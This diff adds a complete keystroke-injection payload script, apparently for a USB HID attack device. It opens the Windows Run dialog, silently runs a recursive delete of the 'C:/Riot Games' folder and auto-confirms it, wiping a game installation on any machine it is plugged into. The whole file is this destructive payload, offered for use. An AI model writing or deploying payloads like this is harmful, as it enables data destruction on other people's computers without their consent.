@@ -1,0 +1,12 @@
+REM Removes all Riot games content from computer
+REM By NeonPinkQuartz
+DELAY 700
+GUI r
+DELAY 100
+STRING cmd /C rmdir /s "C:/Riot Games"
+DELAY 50
+ENTER
+DELAY 300
+STRING y
+DELAY 50
+ENTER
